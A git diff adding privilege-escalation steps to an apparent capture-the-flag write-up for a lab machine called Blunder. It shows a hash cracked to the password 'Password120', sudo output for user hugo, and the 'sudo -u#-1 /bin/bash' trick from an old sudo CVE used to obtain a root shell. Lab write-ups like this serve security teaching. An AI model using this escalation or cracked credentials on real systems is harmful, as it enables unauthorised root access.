@@ -188,6 +188,36 @@ cat users.php
 ## User Escalation
 
 Hugo, the user which the hash corresponds to, appears to be a system user as well.
+
 Using [https://md5decrypt.net/](https://md5decrypt.net/) I was able to crack the hash : **faca404fd5c0a31cf1897b823c695c85cffeb98d : Password120**
 
 ![user](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/user.png)
+
+With a user shell already , I can easily grab the user flag under home folder.
+
+## Upgrading Privileges
+
+I quickly began to do the usual enumeration to find more information on how to grab root access.
+
+### sudo
+```sh
+hugo@blunder:~$ sudo -l 
+sudo -l
+Password: Password120
+
+Matching Defaults entries for hugo on blunder:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+hugo@blunder:~$
+```
+From the above information seems like **hugo** is  configured to run sudo commands as anyone except root.
+This configuration reminds me of an old sudo CVE where we could use something like : ``sudo -u#-1 /bin/bash`` to drop ourselves a root shell.
+
+### root shell
+I attempted the same exploit on the machine to see if  I could get any results :
+![root-shell](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/blunder-writeup/root-shell.png)
+
+And with that being the last part of the writeup , We just owned root and can easily grab the root flag!
